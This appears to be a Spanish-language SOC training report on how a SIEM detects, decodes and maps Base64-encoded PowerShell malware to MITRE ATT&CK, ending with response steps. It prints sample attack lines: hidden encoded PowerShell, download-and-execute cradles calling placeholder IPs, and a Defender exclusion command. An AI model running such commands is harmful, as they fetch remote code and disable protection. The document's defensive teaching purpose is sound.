# 🧪 Reporte 20 — Detecting Base64-Encoded PowerShell Malware

## 🎯 Objetivo
Entender cómo SIEM y analistas SOC detectan comandos PowerShell maliciosos codificados en Base64, decodifican el contenido real y correlacionan comportamiento con MITRE ATT&CK.

---

# 🧠 1. ¿Qué es Base64 en PowerShell?
Los atacantes lo usan para:
- ocultar comandos  
- evadir antivirus  
- comprimir payloads  
- evitar detecciones simples  

Ejemplo típico:

powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4...


La flag `-enc` significa:  
➡️ “ejecutar este script codificado en Base64”

SIEM detecta esto inmediatamente.

---

# 🟧 2. ¿Cómo lo detecta un SIEM?

### Paso 1 — Captura del evento  
PowerShell ScriptBlock Logging genera:

Event ID 4104
ScriptBlockText: SQBFAHgA...


### Paso 2 — Regla del SIEM detecta “-enc”  
Cualquier comando que incluya:

-nop
-w hidden
-enc


se marca como alta sospecha.

### Paso 3 — El SIEM decodifica el Base64  
Ejemplo del código decodificado:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.34/payload.ps1')
Paso 4 — Regla MITRE ATT&CK identifica el comportamiento

IEX → ejecución de código

DownloadString → descarga de payload

URL sospechosa → C2

Paso 5 — Se genera alerta de malware

“La secuencia coincide con PowerShell malicioso utilizado por ransomware.”

🟥 3. Caso Realista Simulado
Comando inicial (capturado en logs):
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4...

Contenido decodificado:
IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/update.ps1')
Add-MpPreference -ExclusionPath "C:\Users\Public"

Interpretación:

descarga de malware

exclusión del antivirus → evasión

ejecución directa en memoria

🧠 4. Análisis (razonamiento humano — AI-proof)

-nop -w hidden -enc = patrón clásico de malware.

El payload descargado desde IP pública indica comando remoto.

Add-MpPreference para excluir carpetas → evasión de antivirus.

Esta secuencia es muy típica de ransomware en fase inicial.

Conclusión:

“Se detectó un comando PowerShell codificado en Base64 que descarga y ejecuta malware. Actividad altamente maliciosa.”

🛡️ 5. Acciones recomendadas

Aislar el host inmediatamente.

Revocar credenciales usadas por el usuario.

Bloquear la IP maliciosa.

Revisar persistencia (Scheduled Tasks, WMI).

Eliminar exclusiones del antivirus.

Analizar si otros hosts ejecutaron comandos similares.

Notificar al equipo de respuesta a incidentes.

🧭 6. MITRE ATT&CK Mapping

T1059.001 — PowerShell

T1105 — Ingress Tool Transfer

T1562.001 — Disable Security Tools

T1204 — User Execution

T1059 — Command Execution

📝 7. Resumen Ejecutivo

Se detectó un comando PowerShell codificado en Base64, ejecutado sin ventanas y con flags típicas de malware. El script decodificado descarga un payload desde una IP sospechosa y modifica configuraciones del antivirus, indicando un ataque en curso. Acción inmediata requerida.